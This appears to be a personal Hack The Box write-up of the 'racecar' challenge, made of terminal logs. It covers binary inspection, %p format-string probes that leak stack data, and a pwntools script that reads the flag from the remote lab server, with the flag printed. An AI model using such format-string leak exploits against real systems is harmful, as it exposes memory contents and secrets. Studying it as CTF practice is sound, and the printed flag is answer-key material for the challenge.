```
download the zip
pass: hackthebox
┌──(kali㉿kali)-[~/Downloads]
└─$ mv racecar.zip ../hackthebox 
                                                                                          
┌──(kali㉿kali)-[~/Downloads]
└─$ cd ../hackthebox       
                                                                                          
┌──(kali㉿kali)-[~/hackthebox]
└─$ unzip racecar.zip 
Archive:  racecar.zip
[racecar.zip] racecar password: 
  inflating: racecar                 

┌──(kali㉿kali)-[~/hackthebox]
└─$ ./racecar

🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌
      ______                                       |xxx|
     /|_||_\`.__                                   | F |                                  
    (   _    _ _\                                  |xxx|                                  
*** =`-(_)--(_)-'                                  | I |                                  
                                                   |xxx|                                  
                                                   | N |                                  
                                                   |xxx|                                  
                                                   | I |                                  
                                                   |xxx|                                  
             _-_-  _/\______\__                    | S |                                  
           _-_-__ / ,-. -|-  ,-.`-.                |xxx|                                  
            _-_- `( o )----( o )-'                 | H |                                  
                   `-'      `-'                    |xxx|                                  
🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌                                  
                                                                                          
Insert your data:                                                                         
                                                                                          
Name: jesus                                                                               
Nickname: witty                                                                           
                                                                                          
[+] Welcome [jesus]!                                                                      
                                                                                          
[*] Your name is [jesus] but everybody calls you.. [witty]!                               
[*] Current coins: [69]                                                                   
                                                                                          
1. Car info                                                                               
2. Car selection                                                                          
> 1                                                                                       
                                                                                          
🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌                                    
                                                                                          
Car #1 stats:   🚗                                                                        
                                                                                          
[Speed]:        ▋▋▋▋                                                                      
                                                                                          
[Acceleration]: ▋▋▋▋▋                                                                     
                                                                                          
[Handling]:     ▋▋▋▋▋▋▋▋                                                                  
                                                                                          
🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌                                    
                                                                                          
Car #2 stats:   🏎                                                                         
                                                                                          
[Speed]:        ▋▋▋▋▋▋▋▋▋                                                                 
                                                                                          
[Acceleration]: ▋▋▋▋▋▋▋▋                                                                  
                                                                                          
[Handling]:     ▋▋                                                                        
                                                                                          
🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌                                    
                                                                                          
1. Car info                                                                               
2. Car selection                                                                          
> 2                                                                                       
                                                                                          
                                                                                          
Select car:                                                                               
1. 🚗                                                                                     
2. 🏎                                                                                      
> 1                                                                                       
                                                                                          
                                                                                          
Select race:                                                                              
1. Highway battle                                                                         
2. Circuit                                                                                
> 2                                                                                       
                                                                                          
[*] Waiting for the race to finish...                                                     
                                                                                          
[+] You won the race!! You get 100 coins!                                                 
[+] Current coins: [169]                                                                  
                                                                                          
[!] Do you have anything to say to the press after your big victory?                      
> [-] Could not open flag.txt. Please contact the creator. 

┌──(kali㉿kali)-[~/hackthebox]
└─$ file racecar        
racecar: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c5631a370f7704c44312f6692e1da56c25c1863c, not stripped

┌──(kali㉿kali)-[~/hackthebox]
└─$ readelf -s racecar                                    

Symbol table '.dynsym' contains 27 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND strcmp@GLIBC_2.0 (2)
     2: 00000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.0 (2)
     3: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]
     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.0 (2)
     5: 00000000     0 FUNC    GLOBAL DEFAULT  UND fgets@GLIBC_2.0 (2)
     6: 00000000     0 FUNC    GLOBAL DEFAULT  UND time@GLIBC_2.0 (2)
     7: 00000000     0 FUNC    GLOBAL DEFAULT  UND sleep@GLIBC_2.0 (2)
     8: 00000000     0 FUNC    GLOBAL DEFAULT  UND alarm@GLIBC_2.0 (2)
     9: 00000000     0 FUNC    GLOBAL DEFAULT  UND __[...]@GLIBC_2.4 (3)
    10: 00000000     0 FUNC    WEAK   DEFAULT  UND [...]@GLIBC_2.1.3 (4)
    11: 00000000     0 FUNC    GLOBAL DEFAULT  UND malloc@GLIBC_2.0 (2)
    12: 00000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.0 (2)
    13: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    14: 00000000     0 FUNC    GLOBAL DEFAULT  UND exit@GLIBC_2.0 (2)
    15: 00000000     0 FUNC    GLOBAL DEFAULT  UND srand@GLIBC_2.0 (2)
    16: 00000000     0 FUNC    GLOBAL DEFAULT  UND strlen@GLIBC_2.0 (2)
    17: 00000000     0 FUNC    GLOBAL DEFAULT  UND __[...]@GLIBC_2.0 (2)
    18: 00000000     0 OBJECT  GLOBAL DEFAULT  UND stdin@GLIBC_2.0 (2)
    19: 00000000     0 FUNC    GLOBAL DEFAULT  UND setvbuf@GLIBC_2.0 (2)
    20: 00000000     0 FUNC    GLOBAL DEFAULT  UND fopen@GLIBC_2.1 (5)
    21: 00000000     0 FUNC    GLOBAL DEFAULT  UND putchar@GLIBC_2.0 (2)
    22: 00000000     0 FUNC    GLOBAL DEFAULT  UND rand@GLIBC_2.0 (2)
    23: 00000000     0 OBJECT  GLOBAL DEFAULT  UND stdout@GLIBC_2.0 (2)
    24: 00000000     0 FUNC    GLOBAL DEFAULT  UND atoi@GLIBC_2.0 (2)
    25: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]
    26: 0000152c     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used

Symbol table '.symtab' contains 96 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 00000154     0 SECTION LOCAL  DEFAULT    1 .interp
     2: 00000168     0 SECTION LOCAL  DEFAULT    2 .note.ABI-tag
     3: 00000188     0 SECTION LOCAL  DEFAULT    3 .note.gnu.build-id
     4: 000001ac     0 SECTION LOCAL  DEFAULT    4 .gnu.hash
     5: 000001cc     0 SECTION LOCAL  DEFAULT    5 .dynsym
     6: 0000037c     0 SECTION LOCAL  DEFAULT    6 .dynstr
     7: 000004a8     0 SECTION LOCAL  DEFAULT    7 .gnu.version
     8: 000004e0     0 SECTION LOCAL  DEFAULT    8 .gnu.version_r
     9: 00000530     0 SECTION LOCAL  DEFAULT    9 .rel.dyn
    10: 00000580     0 SECTION LOCAL  DEFAULT   10 .rel.plt
    11: 00000618     0 SECTION LOCAL  DEFAULT   11 .init
    12: 00000640     0 SECTION LOCAL  DEFAULT   12 .plt
    13: 00000780     0 SECTION LOCAL  DEFAULT   13 .plt.got
    14: 00000790     0 SECTION LOCAL  DEFAULT   14 .text
    15: 00001514     0 SECTION LOCAL  DEFAULT   15 .fini
    16: 00001528     0 SECTION LOCAL  DEFAULT   16 .rodata
    17: 00001d7c     0 SECTION LOCAL  DEFAULT   17 .eh_frame_hdr
    18: 00001df8     0 SECTION LOCAL  DEFAULT   18 .eh_frame
    19: 00003e8c     0 SECTION LOCAL  DEFAULT   19 .init_array
    20: 00003e90     0 SECTION LOCAL  DEFAULT   20 .fini_array
    21: 00003e94     0 SECTION LOCAL  DEFAULT   21 .dynamic
    22: 00003f8c     0 SECTION LOCAL  DEFAULT   22 .got
    23: 00004000     0 SECTION LOCAL  DEFAULT   23 .data
    24: 00004010     0 SECTION LOCAL  DEFAULT   24 .bss
    25: 00000000     0 SECTION LOCAL  DEFAULT   25 .comment
    26: 00000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
    27: 000007e0     0 FUNC    LOCAL  DEFAULT   14 deregister_tm_clones
    28: 00000820     0 FUNC    LOCAL  DEFAULT   14 register_tm_clones
    29: 00000870     0 FUNC    LOCAL  DEFAULT   14 __do_global_dtors_aux
    30: 00004010     1 OBJECT  LOCAL  DEFAULT   24 completed.7283
    31: 00003e90     0 OBJECT  LOCAL  DEFAULT   20 __do_global_dtor[...]
    32: 000008c0     0 FUNC    LOCAL  DEFAULT   14 frame_dummy
    33: 00003e8c     0 OBJECT  LOCAL  DEFAULT   19 __frame_dummy_in[...]
    34: 00000000     0 FILE    LOCAL  DEFAULT  ABS racecar.c
    35: 00000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
    36: 00002018     0 OBJECT  LOCAL  DEFAULT   18 __FRAME_END__
    37: 00000000     0 FILE    LOCAL  DEFAULT  ABS 
    38: 00003e90     0 NOTYPE  LOCAL  DEFAULT   19 __init_array_end
    39: 00003e94     0 OBJECT  LOCAL  DEFAULT   21 _DYNAMIC
    40: 00003e8c     0 NOTYPE  LOCAL  DEFAULT   19 __init_array_start
    41: 00001d7c     0 NOTYPE  LOCAL  DEFAULT   17 __GNU_EH_FRAME_HDR
    42: 00003f8c     0 OBJECT  LOCAL  DEFAULT   22 _GLOBAL_OFFSET_TABLE_
    43: 000014f0     2 FUNC    GLOBAL DEFAULT   14 __libc_csu_fini
    44: 00000000     0 FUNC    GLOBAL DEFAULT  UND strcmp@@GLIBC_2.0
    45: 00000000     0 FUNC    GLOBAL DEFAULT  UND read@@GLIBC_2.0
    46: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]
    47: 000007d0     4 FUNC    GLOBAL HIDDEN    14 __x86.get_pc_thunk.bx
    48: 00004000     0 NOTYPE  WEAK   DEFAULT   23 data_start
    49: 00000000     0 FUNC    GLOBAL DEFAULT  UND printf@@GLIBC_2.0
    50: 00000000     0 FUNC    GLOBAL DEFAULT  UND fgets@@GLIBC_2.0
    51: 00004010     0 NOTYPE  GLOBAL DEFAULT   23 _edata
    52: 00000000     0 FUNC    GLOBAL DEFAULT  UND time@@GLIBC_2.0
    53: 00000000     0 FUNC    GLOBAL DEFAULT  UND sleep@@GLIBC_2.0
    54: 00001352   143 FUNC    GLOBAL DEFAULT   14 menu
    55: 00001514     0 FUNC    GLOBAL DEFAULT   15 _fini
    56: 00000000     0 FUNC    GLOBAL DEFAULT  UND alarm@@GLIBC_2.0
    57: 00000000     0 FUNC    GLOBAL DEFAULT  UND __stack_chk_fail[...]
    58: 000008c9     0 FUNC    GLOBAL HIDDEN    14 __x86.get_pc_thunk.dx
    59: 00000000     0 FUNC    WEAK   DEFAULT  UND __cxa_finalize@@[...]
    60: 00000929   618 FUNC    GLOBAL DEFAULT   14 banner
    61: 00000000     0 FUNC    GLOBAL DEFAULT  UND malloc@@GLIBC_2.0
    62: 00004000     0 NOTYPE  GLOBAL DEFAULT   23 __data_start
    63: 00000000     0 FUNC    GLOBAL DEFAULT  UND puts@@GLIBC_2.0
    64: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    65: 00000000     0 FUNC    GLOBAL DEFAULT  UND exit@@GLIBC_2.0
    66: 00004004     0 OBJECT  GLOBAL HIDDEN    23 __dso_handle
    67: 0000152c     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used
    68: 00000c02   143 FUNC    GLOBAL DEFAULT   14 race_type
    69: 00000000     0 FUNC    GLOBAL DEFAULT  UND srand@@GLIBC_2.0
    70: 00000000     0 FUNC    GLOBAL DEFAULT  UND strlen@@GLIBC_2.0
    71: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_mai[...]
    72: 00001490    93 FUNC    GLOBAL DEFAULT   14 __libc_csu_init
    73: 00000c91  1009 FUNC    GLOBAL DEFAULT   14 car_menu
    74: 00000000     0 OBJECT  GLOBAL DEFAULT  UND stdin@@GLIBC_2.0
    75: 000008cd    92 FUNC    GLOBAL DEFAULT   14 read_int
    76: 00000000     0 FUNC    GLOBAL DEFAULT  UND setvbuf@@GLIBC_2.0
    77: 00000000     0 FUNC    GLOBAL DEFAULT  UND fopen@@GLIBC_2.1
    78: 00000000     0 FUNC    GLOBAL DEFAULT  UND putchar@@GLIBC_2.0
    79: 00004014     0 NOTYPE  GLOBAL DEFAULT   24 _end
    80: 00000790     0 FUNC    GLOBAL DEFAULT   14 _start
    81: 00001528     4 OBJECT  GLOBAL DEFAULT   16 _fp_hw
    82: 000011d2   384 FUNC    GLOBAL DEFAULT   14 car_info
    83: 00000000     0 FUNC    GLOBAL DEFAULT  UND rand@@GLIBC_2.0
    84: 00000000     0 OBJECT  GLOBAL DEFAULT  UND stdout@@GLIBC_2.0
    85: 00004010     0 NOTYPE  GLOBAL DEFAULT   24 __bss_start
    86: 000013e1   168 FUNC    GLOBAL DEFAULT   14 main
    87: 00004008     4 OBJECT  GLOBAL DEFAULT   23 coins
    88: 00001500    20 FUNC    GLOBAL HIDDEN    14 __stack_chk_fail[...]
    89: 0000400c     4 OBJECT  GLOBAL DEFAULT   23 check
    90: 00000000     0 FUNC    GLOBAL DEFAULT  UND atoi@@GLIBC_2.0
    91: 00004010     0 OBJECT  GLOBAL HIDDEN    23 __TMC_END__
    92: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]
    93: 00000618     0 FUNC    GLOBAL DEFAULT   11 _init
    94: 00001082   336 FUNC    GLOBAL DEFAULT   14 info
    95: 00000b93   111 FUNC    GLOBAL DEFAULT   14 setup

┌──(kali㉿kali)-[~/hackthebox]
└─$ nm racecar            
         U alarm@@GLIBC_2.0
         U atoi@@GLIBC_2.0
00000929 T banner
00004010 B __bss_start
000011d2 T car_info
00000c91 T car_menu
0000400c D check
00004008 D coins
00004010 b completed.7283
         w __cxa_finalize@@GLIBC_2.1.3
00004000 D __data_start
00004000 W data_start
000007e0 t deregister_tm_clones
00000870 t __do_global_dtors_aux
00003e90 d __do_global_dtors_aux_fini_array_entry
00004004 D __dso_handle
00003e94 d _DYNAMIC
00004010 D _edata
00004014 B _end
         U exit@@GLIBC_2.0
         U fgets@@GLIBC_2.0
00001514 T _fini
         U fopen@@GLIBC_2.1
00001528 R _fp_hw
000008c0 t frame_dummy
00003e8c d __frame_dummy_init_array_entry
00002018 r __FRAME_END__
00003f8c d _GLOBAL_OFFSET_TABLE_
         w __gmon_start__
00001d7c r __GNU_EH_FRAME_HDR
00001082 T info
00000618 T _init
00003e90 d __init_array_end
00003e8c d __init_array_start
0000152c R _IO_stdin_used
         w _ITM_deregisterTMCloneTable
         w _ITM_registerTMCloneTable
000014f0 T __libc_csu_fini
00001490 T __libc_csu_init
         U __libc_start_main@@GLIBC_2.0
000013e1 T main
         U malloc@@GLIBC_2.0
00001352 T menu
         U printf@@GLIBC_2.0
         U putchar@@GLIBC_2.0
         U puts@@GLIBC_2.0
00000c02 T race_type
         U rand@@GLIBC_2.0
         U read@@GLIBC_2.0
000008cd T read_int
00000820 t register_tm_clones
00000b93 T setup
         U setvbuf@@GLIBC_2.0
         U sleep@@GLIBC_2.0
         U srand@@GLIBC_2.0
         U __stack_chk_fail@@GLIBC_2.4
00001500 T __stack_chk_fail_local
00000790 T _start
         U stdin@@GLIBC_2.0
         U stdout@@GLIBC_2.0
         U strcmp@@GLIBC_2.0
         U strlen@@GLIBC_2.0
         U time@@GLIBC_2.0
00004010 D __TMC_END__
000007d0 T __x86.get_pc_thunk.bx
000008c9 T __x86.get_pc_thunk.dx


┌──(kali㉿kali)-[~/hackthebox]
└─$ checksec --file=racecar
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols           FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   96 Symbols          No    0               3               racecar   

                                                                                          
┌──(kali㉿kali)-[~/hackthebox]
└─$ nc 178.62.61.132 31521

🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌
      ______                                       |xxx|
     /|_||_\`.__                                   | F |                                  
    (   _    _ _\                                  |xxx|                                  
*** =`-(_)--(_)-'                                  | I |                                  
                                                   |xxx|                                  
                                                   | N |                                  
                                                   |xxx|                                  
                                                   | I |                                  
                                                   |xxx|                                  
             _-_-  _/\______\__                    | S |                                  
           _-_-__ / ,-. -|-  ,-.`-.                |xxx|                                  
            _-_- `( o )----( o )-'                 | H |                                  
                   `-'      `-'                    |xxx|                                  
🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌                                  
                                                                                          
Insert your data:                                                                         
                                                                                          
Name: a                                                                                   
Nickname: a                                                                               
                                                                                          
[+] Welcome [a]!                                                                          
                                                                                          
[*] Your name is [a] but everybody calls you.. [a]!                                       
[*] Current coins: [69]                                                                   
                                                                                          
1. Car info                                                                               
2. Car selection                                                                          
> 1                                                                                       
                                                                                          
🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌                                    
                                                                                          
Car #1 stats:   🚗                                                                        
                                                                                          
[Speed]:        ▋▋▋▋                                                                      
                                                                                          
[Acceleration]: ▋▋▋▋▋                                                                     
                                                                                          
[Handling]:     ▋▋▋▋▋▋▋▋                                                                  
                                                                                          
🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌                                    
                                                                                          
Car #2 stats:   🏎                                                                         
                                                                                          
[Speed]:        ▋▋▋▋▋▋▋▋▋                                                                 
                                                                                          
[Acceleration]: ▋▋▋▋▋▋▋▋                                                                  
                                                                                          
[Handling]:     ▋▋                                                                        
                                                                                          
🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌                                    
                                                                                          
1. Car info                                                                               
2. Car selection                                                                          
> 2                                                                                       
                                                                                          
                                                                                          
Select car:                                                                               
1. 🚗                                                                                     
2. 🏎                                                                                      
> 2                                                                                       
                                                                                          
                                                                                          
Select race:                                                                              
1. Highway battle                                                                         
2. Circuit                                                                                
> 1                                                                                       
                                                                                          
[*] Waiting for the race to finish...                                                     
                                                                                          
[+] You won the race!! You get 100 coins!                                                 
[+] Current coins: [169]                                                                  
                                                                                          
[!] Do you have anything to say to the press after your big victory?                      
> hi                                                                                      

The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 
hi

I understand 

https://blog.csdn.net/qq_45894840/article/details/127737915

┌──(kali㉿kali)-[~/hackthebox]
└─$ nc 178.62.61.132 31521

🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌
      ______                                       |xxx|
     /|_||_\`.__                                   | F |                                  
    (   _    _ _\                                  |xxx|                                  
*** =`-(_)--(_)-'                                  | I |                                  
                                                   |xxx|                                  
                                                   | N |                                  
                                                   |xxx|                                  
                                                   | I |                                  
                                                   |xxx|                                  
             _-_-  _/\______\__                    | S |                                  
           _-_-__ / ,-. -|-  ,-.`-.                |xxx|                                  
            _-_- `( o )----( o )-'                 | H |                                  
                   `-'      `-'                    |xxx|                                  
🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌                                  
                                                                                          
Insert your data:                                                                         
                                                                                          
Name: a                                                                                   
aNickname: a                                                                              
                                                                                          
[+] Welcome [a]!                                                                          
                                                                                          
[*] Your name is [a] but everybody calls you.. [aa]!                                      
[*] Current coins: [69]                                                                   
                                                                                          
1. Car info                                                                               
2. Car selection                                                                          
> 2                                                                                       
                                                                                          
                                                                                          
Select car:                                                                               
1. 🚗                                                                                     
2. 🏎                                                                                      
> 2                                                                                       
                                                                                          
                                                                                          
Select race:                                                                              
1. Highway battle                                                                         
2. Circuit                                                                                
> 1                                                                                       
                                                                                          
[*] Waiting for the race to finish...                                                     
                                                                                          
[+] You won the race!! You get 100 coins!                                                 
[+] Current coins: [169]                                                                  
                                                                                          
[!] Do you have anything to say to the press after your big victory?                      
> %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p                             

The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 
0x5722c1c0 0x170 0x565e7dfa 0x36 (nil) 0x26 0x2 0x1 0x565e896c 0x5722c1c0 0x5722c340 0x7b425448 0x5f796877 0x5f643164 0x34735f31 0x745f3376 0x665f3368 0x5f67346c 0x745f6e30 0x355f3368

┌──(kali㉿kali)-[~/hackthebox]
└─$ nc 178.62.61.132 31521

🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌
      ______                                       |xxx|
     /|_||_\`.__                                   | F |                                  
    (   _    _ _\                                  |xxx|                                  
*** =`-(_)--(_)-'                                  | I |                                  
                                                   |xxx|                                  
                                                   | N |                                  
                                                   |xxx|                                  
                                                   | I |                                  
                                                   |xxx|                                  
             _-_-  _/\______\__                    | S |                                  
           _-_-__ / ,-. -|-  ,-.`-.                |xxx|                                  
            _-_- `( o )----( o )-'                 | H |                                  
                   `-'      `-'                    |xxx|                                  
🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌                                  
                                                                                          
Insert your data:                                                                         
                                                                                          
Name: a                                                                                   
Nickname: a                                                                               
                                                                                          
[+] Welcome [a]!                                                                          
                                                                                          
[*] Your name is [a] but everybody calls you.. [a]!                                       
[*] Current coins: [69]                                                                   
                                                                                          
1. Car info                                                                               
2. Car selection                                                                          
> 2                                                                                       
                                                                                          
                                                                                          
Select car:                                                                               
1. 🚗                                                                                     
2. 🏎                                                                                      
> 2                                                                                       
                                                                                          
                                                                                          
Select race:                                                                              
1. Highway battle                                                                         
2. Circuit                                                                                
> 1                                                                                       
                                                                                          
[*] Waiting for the race to finish...                                                     
                                                                                          
[+] You won the race!! You get 100 coins!                                                 
[+] Current coins: [169]                                                                  
                                                                                          
[!] Do you have anything to say to the press after your big victory?                      
> AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p                        

The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 
AAAA 0x579851c0 0x170 0x5655bdfa 0x43 0x2 0x26 0x2 0x1 0x5655c96c 0x579851c0 0x57985340 0x7b425448 0x5f796877 0x5f643164 0x34735f31 0x745f3376 0x665f3368 0x5f67346c 0x745f6e30 0x355f3368

┌──(kali㉿kali)-[~/hackthebox]
└─$ cat car.py             
from pwn import *

offset_start_flag = 12
len_of_flag = 44
offset_end_flag = offset_start_flag + 11

formatstring = ""

for i in range(offset_start_flag, offset_end_flag):
        formatstring += "%"+str(i)+"$p "

r = remote("178.62.61.132", 31521)

r.sendlineafter("Name: ", "a")
r.sendlineafter("Nickname: ", "a")
r.sendlineafter("> ", "2")
r.sendlineafter("> ", "2")
r.sendlineafter("> ", "1")

r.sendlineafter("> ", formatstring)
r.recv()
response = r.recv()

#Format output
preflag = (response.decode("utf-8").split("m\n"))[1]
preflag = preflag.split()

flag = ""
for hexadecimal in preflag:
        flag += p32(int(hexadecimal, base=16)).decode("utf-8")

print(flag)

┌──(kali㉿kali)-[~/hackthebox]
└─$ python3 car.py
[+] Opening connection to 178.62.61.132 on port 31521: Done
/home/kali/hackthebox/car.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.sendlineafter("Name: ", "a")
/home/kali/.local/lib/python3.10/site-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
/home/kali/hackthebox/car.py:15: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.sendlineafter("Nickname: ", "a")
/home/kali/hackthebox/car.py:16: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.sendlineafter("> ", "2")
/home/kali/hackthebox/car.py:17: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.sendlineafter("> ", "2")
/home/kali/hackthebox/car.py:18: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.sendlineafter("> ", "1")
/home/kali/hackthebox/car.py:20: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.sendlineafter("> ", formatstring)
HTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}\x00
[*] Closed connection to 178.62.61.132 port 31521

However, if we do everything in Python, we can automate the process of converting little-endian to big-endian and convert hexadecimal to ASCII easily.

[!] Do you have anything to say to the press after your big victory?                      
> %12$x %13$x %14$x %15$x %16$x %17$x %18$x %19$x %20$x %21$x %22$x %23$x %24$x           

The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 
7b425448 5f796877 5f643164 34735f31 745f3376 665f3368 5f67346c 745f6e30 355f3368 6b633474 7d213f b21c2400 f7f823fc

cyberchef from swap-endiannes and hex 

HTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck²?!}÷.$..ü#ø




```


[[RedPanda]]